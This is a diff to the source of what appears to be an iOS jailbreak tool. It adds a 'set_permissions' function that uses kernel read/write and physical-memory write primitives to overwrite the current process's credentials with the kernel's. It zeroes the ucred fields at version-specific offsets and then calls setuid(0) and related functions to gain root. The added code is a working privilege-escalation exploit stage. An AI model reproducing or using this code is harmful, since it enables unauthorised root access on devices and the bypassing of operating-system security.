@@ -85,6 +85,49 @@ char *getFilePath(const char *fileName) {
     return [filePathObj UTF8String];
 }
 
+int set_permissions(void) {
+    uint8_t proc_ucred = 0x8c;
+    if (strstr(ckernv, "3248.6") || strstr(ckernv, "3248.5") || strstr(ckernv, "3248.4")) {
+        proc_ucred = 0xa4;
+    } else if (strstr(ckernv, "3248.3") || strstr(ckernv, "3248.2") || strstr(ckernv, "3248.10")) {
+        proc_ucred = 0x98;
+    }
+    for (uint32_t i = 0; i < 5; i++) {
+        uint32_t kern_cred = kread32(kinfo->kern_proc_addr + proc_ucred);
+        uint32_t ucred_pa = kvtophys(kread32(kinfo->self_proc_addr + proc_ucred));
+        physwrite32(ucred_pa + 0xc, 0);
+        physwrite32(ucred_pa + 0x10, 0);
+        physwrite32(ucred_pa + 0x14, 0);
+        physwrite32(ucred_pa + 0x1c, 0);
+        physwrite32(ucred_pa + 0x5c, 0);
+        usleep(10000);
+
+        setuid(0);
+        setgid(0);
+        seteuid(0);
+        setegid(0);
+        setruid(0);
+        setrgid(0);
+
+        kwrite32(kinfo->self_proc_addr + proc_ucred, kern_cred);
+        usleep(100000);
+        sync();
+
+        kwrite32(kinfo->self_proc_addr + proc_ucred, kern_cred);
+        usleep(100000);
+        sync();
+
+        setuid(0);
+        setgid(0);
+        seteuid(0);
+        setegid(0);
+        setruid(0);
+        setrgid(0);
+        if (getuid() == 0) return 0;
+    }
+    return (getuid() == 0) ? 0 : -1;
+}
+
 void postjailbreak_remount(void) {
     print_log("[*] remounting rootfs\n");
     char* nmr = strdup("/dev/disk0s1s1");
